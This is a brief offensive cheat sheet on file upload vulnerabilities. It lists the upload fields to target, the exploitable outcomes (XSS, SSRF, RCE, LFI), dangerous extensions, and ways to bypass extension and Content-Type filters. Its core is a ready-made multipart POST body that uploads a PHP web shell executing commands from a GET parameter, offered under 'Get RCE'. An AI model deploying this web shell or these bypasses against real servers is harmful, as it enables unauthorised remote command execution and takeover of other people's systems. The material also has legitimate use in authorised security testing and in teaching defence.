# File Upload Vulnerability:

     > Parameters
          - Resume Upload
          - photo upload
          - issue file
          - any file ext e.g png, pdf
          
     > Vulnerabilities from file upload:
          - XSS
          - SSRF
          - RCE
          - LFI
     
     > Extensions we should try to upload
         - php  
         - svg
         - html
         - aspx 
         - xml
         
     > Prevention mechanisms of file upload:
        - White listing   (e.g photo upload parameter: only allowed .png, .jpg, .jpeg)
        - Black Listing   (e.g these extensions not allowed .php, .svg, , .html)
        
    > Bypasses:
        - Try alternative Extensions (.php  -> .phtml, .php1 - .php5)
        - Content-Type bypasses



### Add this in POST Request & Get RCE

```
-----------------------------------------------99999999999999999999999
Content-Disposition: form-data; name="rce.php"; filename="attacker.php"
Content-Type: application/x-php

<?php

system($_GET["cmd"]);

?>
-----------------------------------------------99999999999999999999999
```

### Burp Extension (Upload Scanner):-
https://www.youtube.com/watch?v=dc_57FaKj3E

### A CLI Tool:-
https://www.youtube.com/watch?v=RpLtycOYjfs
